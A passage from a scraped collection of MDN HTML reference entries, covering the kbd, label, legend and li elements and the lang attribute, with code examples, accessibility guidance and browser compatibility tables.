Specifications\n\n[TABLE]\n\n## See also\n\n- [Other different global attributes](../global_attributes)\n- Other microdata related global attributes:\n  - [`itemid`](itemid)\n  - [`itemprop`](itemprop)\n  - [`itemref`](itemref)\n  - [`itemscope`](itemscope)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/itemtype](https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/itemtype)"
- name: kbd
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<kbd\\>: The Keyboard Input element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since July 2015.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Fkbd&level=high)\n\nThe `<kbd>` [HTML](../index) element represents a span of inline text denoting textual user input from a keyboard, voice input, or any other text entry device. By convention, the [user agent](https://developer.mozilla.org/en-US/docs/Glossary/User_agent) defaults to rendering the contents of a `<kbd>` element using its default monospace font, although this is not mandated by the HTML standard.\n\n## Try it\n\n#### HTML Demo: \\<kbd\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <p>Please press <kbd>Ctrl</kbd> + <kbd>Shift</kbd> + <kbd>R</kbd> to re-render an MDN page.</p>\n\n    kbd {\n      background-color: #eee;\n      border-radius: 3px;\n      border: 1px solid #b4b4b4;\n      box-shadow:\n        0 1px 1px rgba(0, 0, 0, 0.2),\n        0 2px 0 0 rgba(255, 255, 255, 0.7) inset;\n      color: #333;\n      display: inline-block;\n      font-size: 0.85em;\n      font-weight: 700;\n      line-height: 1;\n      padding: 2px 4px;\n      white-space: nowrap;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n`<kbd>` may be nested in various combinations with the [`<samp>`](samp) (Sample Output) element to represent various forms of input or output based on visual cues.\n\n## Attributes\n\nThis element only includes the [global attributes](../global_attributes).\n\n## Usage notes\n\nOther elements can be used in tandem with `<kbd>` to represent more specific scenarios:\n\n- Nesting a `<kbd>` element within another `<kbd>` element represents an actual key or other unit of input as a portion of a larger input. See [Representing keystrokes within an input](#representing_keystrokes_within_an_input) below.\n- Nesting a `<kbd>` element inside a [`<samp>`](samp) element represents input that has been echoed back to the user by the system. See [Echoed input](#echoed_input), below, for an example.\n- Nesting a `<samp>` element inside a `<kbd>` element, on the other hand, represents input which is based on text presented by the system, such as the names of menus and menu items, or the names of buttons displayed on the screen. See the example under [Representing onscreen input options](#representing_onscreen_input_options) below.\n\n**Note:** You can define a custom style to override the browser's default font selection for the `<kbd>` element, although the user's preferences may potentially override your CSS.\n\n## Examples\n\n### Basic example\n\nhtml\n\n```\n<p>\n  Use the command <kbd>help mycommand</kbd> to view documentation for the\n  command \"mycommand\".\n</p>\n```\n\n#### Result\n\n### Representing keystrokes within an input\n\nTo describe an input comprised of multiple keystrokes, you can nest multiple `<kbd>` elements, with an outer `<kbd>` element representing the overall input and each individual keystroke or component of the input enclosed within its own `<kbd>`.\n\n#### Unstyled\n\nFirst, let's look at what this looks like as just plain HTML.\n\n##### HTML\n\nhtml\n\n```\n<p>\n  You can also create a new document using the\n  <kbd><kbd>Ctrl</kbd>+<kbd>N</kbd></kbd> keyboard shortcut.\n</p>\n```\n\nThis wraps the entire key sequence in an outer `<kbd>` element, then each individual key within its own, in order to denote the components of the sequence.\n\n**Note:** You don't need to do all this wrapping; you can choose to simplify it by leaving out the external `<kbd>` element. In other words, simplifying this to just `<kbd>Ctrl</kbd>+<kbd>N</kbd>` would be perfectly valid.\n\nDepending on your style sheet, though, you may find it useful to do this kind of nesting.\n\n##### Result\n\nThe output looks like this without a style sheet applied:\n\n#### With custom styles\n\nWe can make more sense of this by adding some CSS:\n\n##### CSS\n\nWe add a new selector for nested `<kbd>` elements, `kbd>kbd`, which we can apply when rendering keyboard keys:\n\ncss\n\n```\nkbd > kbd {\n  border-radius: 3px;\n  padding: 1px 2px 0;\n  border: 1px solid black;\n}\n```\n\n##### HTML\n\nThen we update the HTML to use this class on the keys in the output to be presented:\n\nhtml\n\n```\n<p>\n  You can also create a new document by pressing the\n  <kbd><kbd>Ctrl</kbd>+<kbd>N</kbd></kbd> shortcut.\n</p>\n```\n\n##### Result\n\nThe result is just what we want!\n\n### Echoed input\n\nNesting a `<kbd>` element inside a [`<samp>`](samp) element represents input that has been echoed back to the user by the system.\n\nhtml\n\n```\n<p>\n  If a syntax error occurs, the tool will output the initial command you typed\n  for your review:\n</p>\n<blockquote>\n  <samp><kbd>custom-git ad my-new-file.cpp</kbd></samp>\n</blockquote>\n```\n\n#### Result\n\n### Representing onscreen input options\n\nNesting a `<samp>` element inside a `<kbd>` element represents input which is based on text presented by the system, such as the names of menus and menu items, or the names of buttons displayed on the screen.\n\nFor example, you can explain how to choose the \"New Document\" option in the \"File\" menu using HTML that looks like this:\n\nhtml\n\n```\n<p>\n  To create a new file, choose the <kbd><kbd><samp>File</samp></kbd>\n  ⇒<kbd><samp>New Document</samp></kbd></kbd> menu option.\n</p>\n\n<p>\n  Don't forget to click the <kbd><samp>OK</samp></kbd> button to confirm once\n  you've entered the name of the new file.\n</p>\n```\n\nThis does some interesting nesting. For the menu option description, the entire input is enclosed in a `<kbd>` element. Then, inside that, both the menu and menu item names are contained within both `<kbd>` and `<samp>`, indicating an input which is selected from a screen widget.\n\n#### Result\n\n## Technical summary\n\n|                                             |                                                                                                                                   |\n|---------------------------------------------|-----------------------------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | [Flow content](../content_categories#flow_content), [phrasing content](../content_categories#phrasing_content), palpable content. |\n| Permitted content                           | [Phrasing content](../content_categories#phrasing_content).                                                                       |\n| Tag omission                                | None, both the starting and ending tag are mandatory.                                                                             |\n| Permitted parents                           | Any element that accepts [phrasing content](../content_categories#phrasing_content).                                              |\n| Implicit ARIA role                          | [No corresponding role](https://www.w3.org/TR/html-aria/#dfn-no-corresponding-role)                                               |\n| Permitted ARIA roles                        | Any                                                                                                                               |\n| DOM interface                               | [`HTMLElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement)                                                     |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n[TABLE]\n\n## See also\n\n- [`<code>`](code)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/kbd](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/kbd)"
- name: kind (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`kind`](element/track#kind)

    [`<track>`](element/track)

    Specifies the kind of text track.
- name: label
  summary: The <label> HTML element represents a caption for an item in a user interface
  description: "# \\<label\\>: The Label element\n\nThe `<label>` [HTML](../index) element represents a caption for an item in a user interface.\n\n## Try it\n\n#### HTML Demo: \\<label\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <div class=\"preference\">\n      <label for=\"cheese\">Do you like cheese?</label>\n      <input type=\"checkbox\" name=\"cheese\" id=\"cheese\" />\n    </div>\n\n    <div class=\"preference\">\n      <label for=\"peas\">Do you like peas?</label>\n      <input type=\"checkbox\" name=\"peas\" id=\"peas\" />\n    </div>\n\n    .preference {\n      display: flex;\n      justify-content: space-between;\n      width: 60%;\n      margin: 0.5rem;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\nAssociating a `<label>` with a form control, such as [`<input>`](input) or [`<textarea>`](textarea) offers some major advantages:\n\n- The label text is not only visually associated with its corresponding text input; it is programmatically associated with it too. This means that, for example, a screen reader will read out the label when the user is focused on the form input, making it easier for an assistive technology user to understand what data should be entered.\n- When a user clicks or touches/taps a label, the browser passes the focus to its associated input (the resulting event is also raised for the input). That increased hit area for focusing the input provides an advantage to anyone trying to activate it — including those using a touch-screen device.\n\nTo explicitly associate a `<label>` element with an `<input>` element, you first need to add the `id` attribute to the `<input>` element. Next, you add the `for` attribute to the `<label>` element, where the value of `for` is the same as the `id` in the `<input>` element.\n\nAlternatively, you can nest the `<input>` directly inside the `<label>`, in which case the `for` and `id` attributes are not needed because the association is implicit:\n\nhtml\n\n```\n<label>\n  Do you like peas?\n  <input type=\"checkbox\" name=\"peas\" />\n</label>\n```\n\nThe form control that a label is labeling is called the *labeled control* of the label element. Multiple labels can be associated with the same form control:\n\nhtml\n\n```\n<label for=\"username\">Enter your username:</label>\n<input id=\"username\" name=\"username\" type=\"text\" />\n<label for=\"username\">Forgot your username?</label>\n```\n\nElements that can be associated with a `<label>` element include [`<button>`](button), [`<input>`](input) (except for `type=\"hidden\"`), [`<meter>`](meter), [`<output>`](output), [`<progress>`](progress), [`<select>`](select) and [`<textarea>`](textarea).\n\n## Attributes\n\nThis element includes the [global attributes](../global_attributes).\n\n[`for`](../attributes/for)  \nThe value of the `for` attribute must be a single [`id`](../global_attributes#id) for a [labelable](../content_categories#labelable) form-related element in the same document as the `<label>` element. So, any given `label` element can be associated with only one form control.\n\n**Note:** To programmatically set the `for` attribute, use [`htmlFor`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLLabelElement/htmlFor).\n\nThe first element in the document with an `id` attribute matching the value of the `for` attribute is the *labeled control* for this `label` element — if the element with that `id` is actually a [labelable element](https://html.spec.whatwg.org/multipage/forms.html#category-label). If it is *not* a labelable element, then the `for` attribute has no effect. If there are other elements that also match the `id` value, later in the document, they are not considered.\n\nMultiple `label` elements can be given the same value for their `for` attribute; doing so causes the associated form control (the form control that `for` value references) to have multiple labels.\n\n**Note:** A `<label>` element can have both a `for` attribute and a contained control element, as long as the `for` attribute points to the contained control element.\n\n## Styling with CSS\n\nThere are no special styling considerations for `<label>` elements — structurally they are simple inline elements, and so can be styled in much the same way as a [`<span>`](span) or [`<a>`](a) element. You can apply styling to them in any way you want, as long as you don't cause the text to become difficult to read.\n\n## Accessibility\n\n### Interactive content\n\nDon't place interactive elements such as [anchors](a) or [buttons](button) inside a `label`. Doing so makes it difficult for people to activate the form input associated with the `label`.\n\n**Don't do this:**\n\nhtml\n\n```\n<label for=\"tac\">\n  <input id=\"tac\" type=\"checkbox\" name=\"terms-and-conditions\" />\n  I agree to the <a href=\"terms-and-conditions.html\">Terms and Conditions</a>\n</label>\n```\n\n**Prefer this:**\n\nhtml\n\n```\n<label for=\"tac\">\n  <input id=\"tac\" type=\"checkbox\" name=\"terms-and-conditions\" />\n  I agree to the Terms and Conditions\n</label>\n<p>\n  <a href=\"terms-and-conditions.html\">Read our Terms and Conditions</a>\n</p>\n```\n\n### Headings\n\nPlacing [heading elements](heading_elements) within a `<label>` interferes with many kinds of assistive technology, because headings are commonly used as [a navigation aid](heading_elements#navigation). If the label's text needs to be adjusted visually, use CSS classes applied to the `<label>` element instead.\n\nIf a [form](form), or a section of a form needs a title, use the [`<legend>`](legend) element placed within a [`<fieldset>`](fieldset).\n\n**Don't do this:**\n\nhtml\n\n```\n<label for=\"your-name\">\n  <h3>Your name</h3>\n  <input id=\"your-name\" name=\"your-name\" type=\"text\" />\n</label>\n```\n\n**Prefer this:**\n\nhtml\n\n```\n<label class=\"large-label\" for=\"your-name\">\n  Your name\n  <input id=\"your-name\" name=\"your-name\" type=\"text\" />\n</label>\n```\n\n### Buttons\n\nAn [`<input>`](input) element with a `type=\"button\"` declaration and a valid `value` attribute does not need a label associated with it. Doing so may actually interfere with how assistive technology parses the button input. The same applies for the [`<button>`](button) element.\n\n## Examples\n\n### Defining an implicit label\n\nhtml\n\n```\n<label>Click me <input type=\"text\" /></label>\n```\n\n### Defining an explicit label with the \"for\" attribute\n\nhtml\n\n```\n<label for=\"username\">Click me to focus on the input field</label>\n<input type=\"text\" id=\"username\" />\n```\n\n## Technical summary\n\n|                                             |                                                                                                                                                                                                                                                                               |\n|---------------------------------------------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | [Flow content](../content_categories#flow_content), [phrasing content](../content_categories#phrasing_content), [interactive content](../content_categories#interactive_content), [form-associated element](../content_categories#form-associated_content), palpable content. |\n| Permitted content                           | [Phrasing content](../content_categories#phrasing_content), but no descendant `label` elements. No [labelable](../content_categories#labelable) elements other than the labeled control are allowed.                                                                          |\n| Tag omission                                | None, both the starting and ending tag are mandatory.                                                                                                                                                                                                                         |\n| Permitted parents                           | Any element that accepts [phrasing content](../content_categories#phrasing_content).                                                                                                                                                                                          |\n| Implicit ARIA role                          | [No corresponding role](https://www.w3.org/TR/html-aria/#dfn-no-corresponding-role)                                                                                                                                                                                           |\n| Permitted ARIA roles                        | No `role` permitted                                                                                                                                                                                                                                                           |\n| DOM interface                               | [`HTMLLabelElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLLabelElement)                                                                                                                                                                                       |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|         | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|---------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|         | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `label` | 1       | 12   | 1       | 15    | ≤4     | 18             | 4                   | 14            | ≤3.2          | 1.0              | 4.4             |     |\n| `for`   | 1       | 12   | 1       | 15    | ≤4     | 18             | 4                   | 14            | ≤3.2          | 1.0              | 4.4             |     |\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/label](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/label)"
- name: label (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`label`](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/label)

    [`<optgroup>`](element/optgroup), [`<option>`](element/option), [`<track>`](element/track)

    Specifies a user-readable title of the element.
- name: lang (attribute)
  summary: 'The lang global attribute helps define the language of an element: the language that non-editable elements are written in, or the language that the editable elements should be written in by the user'
  description: "# lang\n\nThe `lang` [global attribute](../global_attributes) helps define the language of an element: the language that non-editable elements are written in, or the language that the editable elements should be written in by the user. The attribute contains a single \"language tag\" in the format defined in [RFC 5646: Tags for Identifying Languages (also known as BCP 47)](https://datatracker.ietf.org/doc/html/rfc5646).\n\n**Note:** The default value of `lang` is the empty string, which means that the language is unknown. Therefore, it is recommended to always specify an appropriate value for this attribute.\n\n## Try it\n\n#### HTML Demo: lang\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <p>This paragraph is English, but the language is not specifically defined.</p>\n\n    <p lang=\"en-GB\">This paragraph is defined as British English.</p>\n\n    <p lang=\"fr\">Ce paragraphe est défini en français.</p>\n\n    p::before {\n      padding-right: 5px;\n    }\n\n    [lang='en-GB']::before {\n      content: '(In British English) ';\n    }\n\n    [lang='fr']::before {\n      content: '(In French) ';\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\nIf the attribute value is the *empty string* (`lang=\"\"`), the language is set to *unknown*; if the language tag is not valid according to BCP47, it is set to *invalid*.\n\nEven if the **lang** attribute is set, it may not be taken into account, as the [**xml:lang**](../global_attributes#lang) attribute has priority.\n\nFor the CSS pseudo-class [`:lang`](https://developer.mozilla.org/en-US/docs/Web/CSS/:lang), two invalid language names are different if their names are different. So while `:lang(es)` matches both `lang=\"es-ES\"` and `lang=\"es-419\"`, `:lang(xyzzy)` would *not* match `lang=\"xyzzy-Zorp!\"`.\n\n## Language tag syntax\n\nThe full BCP47 syntax is in-depth enough to mark extremely specific language dialects, but most usage is much simpler.\n\nA language tag is made of hyphen-separated *language subtags*, where each subtag indicates a certain property of the language. The 3 most common subtags are:\n\n[Language subtag](#language_subtag)  \nRequired. A 2-or-3-character code that defines the basic language, typically written in all lowercase. For example, the language code for English is `en`, and the code for Badeshi is `bdz`.\n\n[Script subtag](#script_subtag)  \nOptional. This subtag defines the writing system used for the language, and is always 4 characters long, with the first letter capitalized. For example, French-in-Braille is `fr-Brai` and `ja-Kana` is Japanese written with the Katakana alphabet. If the language is written in a highly typical way, like English in the Latin alphabet, there is no need to use this subtag.\n\n[Region subtag](#region_subtag)  \nOptional. This subtag defines a dialect of the base language from a particular location, and is either 2 letters in ALLCAPS matching a country code, or 3 numbers matching a non-country area. For example, `es-ES` is for Spanish as spoken in Spain, and `es-013` is Spanish as spoken in Central America. \"International Spanish\" would just be `es`.\n\nThe script subtag precedes the region subtag if both are present — `ru-Cyrl-BY` is Russian, written in the Cyrillic alphabet, as spoken in Belarus.\n\nTo find the correct subtag codes for a language, try [the Language Subtag Lookup](https://r12a.github.io/app-subtags/).\n\n## Accessibility concerns\n\nWCAG Success Criterion 3.1.1 **requires** that a page language is specified in a way which may be 'programmatically determined' (i.e. via the `lang` attribute).\n\nWCAG Success Criterion 3.1.2 requires that pages with **parts** in different languages have the languages of those parts specified too. Again, the `lang` attribute is the correct mechanism for this.\n\nThe purpose of these requirements is primarily to allow assistive technologies such as screen readers to invoke the correct pronunciation.\n\nFor example, the language menu on this site (MDN) includes a `lang` attribute for each entry:\n\nhtml\n\n```\n<div class=\"dropdown-container language-menu\">\n  <button\n    id=\"header-language-menu\"\n    type=\"button\"\n    class=\"dropdown-menu-label\"\n    aria-haspopup=\"true\"\n    aria-owns=\"language-menu\"\n    aria-label=\"Current language is English. Choose your preferred language.\">\n    English\n    <span class=\"dropdown-arrow-down\" aria-hidden=\"true\">▼</span>\n  </button>\n  <ul\n    id=\"language-menu\"\n    class=\"dropdown-menu-items right show\"\n    aria-expanded=\"true\"\n    role=\"menu\">\n    <li lang=\"ca\" role=\"menuitem\">\n      <a href=\"/ca/docs/Web/HTML/Global_attributes/lang\" title=\"Catalan\">\n        <bdi>Català</bdi>\n      </a>\n    </li>\n    <li lang=\"de\" role=\"menuitem\">\n      <a href=\"/de/docs/Web/HTML/Globale_Attribute/lang\" title=\"German\">\n        <bdi>Deutsch</bdi>\n      </a>\n    </li>\n    <li lang=\"es\" role=\"menuitem\">\n      <a href=\"/es/docs/Web/HTML/Atributos_Globales/lang\" title=\"Spanish\">\n        <bdi>Español</bdi>\n      </a>\n    </li>\n    <li lang=\"fr\" role=\"menuitem\">\n      <a href=\"/fr/docs/Web/HTML/Attributs_universels/lang\" title=\"French\">\n        <bdi>Français</bdi>\n      </a>\n    </li>\n    <li lang=\"ja\" role=\"menuitem\">\n      <a href=\"/ja/docs/Web/HTML/Global_attributes/lang\" title=\"Japanese\">\n        <bdi>日本語</bdi>\n      </a>\n    </li>\n    <li lang=\"ko\" role=\"menuitem\">\n      <a href=\"/ko/docs/Web/HTML/Global_attributes/lang\" title=\"Korean\">\n        <bdi>한국어</bdi>\n      </a>\n    </li>\n    <li lang=\"pt-BR\" role=\"menuitem\">\n      <a\n        href=\"/pt-BR/docs/Web/HTML/Global_attributes/lang\"\n        title=\"Portuguese (Brazilian)\">\n        <bdi>Português (do&nbsp;Brasil)</bdi>\n      </a>\n    </li>\n    <li lang=\"ru\" role=\"menuitem\">\n      <a href=\"/ru/docs/Web/HTML/Global_attributes/lang\" title=\"Russian\">\n        <bdi>Русский</bdi>\n      </a>\n    </li>\n    <li lang=\"uk\" role=\"menuitem\">\n      <a\n        href=\"/uk/docs/Web/HTML/%D0%97%D0%B0%D0%B3%D0%B0%D0%BB%D1%8C%D0%BD%D1%96_%D0%B0%D1%82%D1%80%D0%B8%D0%B1%D1%83%D1%82%D0%B8/lang\"\n        title=\"Ukrainian\">\n        <bdi>Українська</bdi>\n      </a>\n    </li>\n    <li lang=\"zh-Hans\" role=\"menuitem\">\n      <a\n        href=\"/zh-CN/docs/Web/HTML/Global_attributes/lang\"\n        title=\"Chinese (Simplified)\">\n        <bdi>中文 (简体)</bdi>\n      </a>\n    </li>\n    <li>\n      <a\n        href=\"/en-US/docs/Web/HTML/Global_attributes/lang$locales\"\n        rel=\"nofollow\"\n        id=\"translations-add\">\n        Add a translation\n      </a>\n    </li>\n  </ul>\n</div>\n```\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|        | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|--------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|        | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `lang` | 1       | 12   | 1       | 15    | ≤4     | 18             | 4                   | 14            | ≤3.2          | 1.0              | 4.4             |     |\n\n## See also\n\n- All [global attributes](../global_attributes).\n- [`Content-Language` HTTP Header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Language)\n- HTML [`translate`](../global_attributes#translate) attribute\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/lang](https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/lang)"
- name: language (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`language`](element/script#language) Deprecated

    [`<script>`](element/script)

    Defines the script language used in the element.
- name: legend
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<legend\\>: The Field Set Legend element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since July 2015.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Flegend&level=high)\n\nThe `<legend>` [HTML](../index) element represents a caption for the content of its parent [`<fieldset>`](fieldset).\n\n## Try it\n\n#### HTML Demo: \\<legend\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <fieldset>\n      <legend>Choose your favorite monster</legend>\n\n      <input type=\"radio\" id=\"kraken\" name=\"monster\" value=\"K\" />\n      <label for=\"kraken\">Kraken</label><br />\n\n      <input type=\"radio\" id=\"sasquatch\" name=\"monster\" value=\"S\" />\n      <label for=\"sasquatch\">Sasquatch</label><br />\n\n      <input type=\"radio\" id=\"mothman\" name=\"monster\" value=\"M\" />\n      <label for=\"mothman\">Mothman</label>\n    </fieldset>\n\n    legend {\n      background-color: #000;\n      color: #fff;\n      padding: 3px 6px;\n    }\n\n    input {\n      margin: 0.4rem;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Attributes\n\nThis element only includes the [global attributes](../global_attributes).\n\n## Examples\n\nSee [`<form>`](form) for examples on `<legend>`.\n\n## Technical summary\n\n|                                             |                                                                                                               |\n|---------------------------------------------|---------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | None.                                                                                                         |\n| Permitted content                           | [Phrasing content](../content_categories#phrasing_content) and [headings](heading_elements) (h1–h6 elements). |\n| Tag omission                                | None, both the starting and ending tag are mandatory.                                                         |\n| Permitted parents                           | A [`<fieldset>`](fieldset) whose first child is this `<legend>` element                                       |\n| Implicit ARIA role                          | [No corresponding role](https://www.w3.org/TR/html-aria/#dfn-no-corresponding-role)                           |\n| Permitted ARIA roles                        | No `role` permitted                                                                                           |\n| DOM interface                               | [`HTMLLegendElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLLegendElement)                     |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|          | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|----------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|          | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `legend` | 1       | 12   | 1       | ≤12.1 | 3      | 18             | 4                   | ≤12.1         | 1             | 1.0              | 4.4             |     |\n| `align`  | 1       | 12   | 1       | ≤12.1 | ≤4     | 18             | 4                   | ≤12.1         | ≤3.2          | 1.0              | 4.4             |     |\n\n## See also\n\n- [ARIA: Form role](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/form_role)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/legend](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/legend)"
- name: li
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<li\\>: The List Item element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since July 2015.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Fli&level=high)\n\nThe `<li>` [HTML](../index) element is used to represent an item in a list. It must be contained in a parent element: an ordered list ([`<ol>`](ol)), an unordered list ([`<ul>`](ul)), or a menu ([`<menu>`](menu)). In menus and unordered lists, list items are usually displayed using bullet points. In ordered lists, they are usually displayed with an ascending counter on the left, such as a number or letter.\n\n## Try it\n\n#### HTML Demo: \\<li\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <p>Apollo astronauts:</p>\n\n    <ul>\n      <li>Neil Armstrong</li>\n      <li>Alan Bean</li>\n      <li>Peter Conrad</li>\n      <li>Edgar Mitchell</li>\n      <li>Alan Shepard</li>\n    </ul>\n\n    p,\n    li {\n      font:\n        1rem 'Fira Sans',\n        sans-serif;\n    }\n\n    p {\n      font-weight: bold;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Attributes\n\nThis element includes the [global attributes](../global_attributes).\n\n[`value`](#value)  \nThis integer attribute indicates the current ordinal value of the list item as defined by the [`<ol>`](ol) element. The only allowed value for this attribute is a number, even if the list is displayed with Roman numerals or letters. List items that follow this one continue numbering from the value set. The **value** attribute has no meaning for unordered lists ([`<ul>`](ul)) or for menus ([`<menu>`](menu)).\n\n[`type`](#type) Deprecated Non-standard  \nThis character attribute indicates the numbering type:\n\n- `a`: lowercase letters\n- `A`: uppercase letters\n- `i`: lowercase Roman numerals\n- `I`: uppercase Roman numerals\n- `1`: numbers\n\nThis type overrides the one used by its parent [`<ol>`](ol) element, if any.\n\n**Note:** This attribute has been deprecated; use the CSS [`list-style-type`](https://developer.mozilla.org/en-US/docs/Web/CSS/list-style-type) property instead.\n\n## Examples\n\nFor more detailed examples, see the [`<ol>`](ol) and [`<ul>`](ul) pages.\n\n### Ordered list\n\nhtml\n\n```\n<ol>\n  <li>first item</li>\n  <li>second item</li>\n  <li>third item</li>\n</ol>\n```\n\n#### Result\n\n### Ordered list with a custom value\n\nhtml\n\n```\n<ol type=\"I\">\n  <li value=\"3\">third item</li>\n  <li>fourth item</li>\n  <li>fifth item</li>\n</ol>\n```\n\n#### Result\n\n### Unordered list\n\nhtml\n\n```\n<ul>\n  <li>first item</li>\n  <li>second item</li>\n  <li>third item</li>\n</ul>\n```\n\n#### Result\n\n## Technical summary\n\n|                                             |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |\n|---------------------------------------------|--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | None|\n| Permitted content                           | [Flow content](../content_categories#flow_content).                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |\n| Tag omission                                | The end tag can be omitted if the list item is immediately followed by another `<li>` element, or if there is no more content in its parent element|\n| Permitted parents                           | An [`<ul>`](ul), [`<ol>`](ol), or [`<menu>`](menu) element. Though not a conforming usage, the obsolete [`<dir>`](dir) can also be a parent|\n| Implicit ARIA role                          | [`listitem`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/listitem_role) when child of an [`ol`](ol), [`ul`](ul) or [`menu`](menu|\n| Permitted ARIA roles                        | [`menuitem`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/menuitem_role), [`menuitemcheckbox`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/menuitemcheckbox_role), [`menuitemradio`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/menuitemradio_role), [`option`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/option_role), [`none`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/none_role), 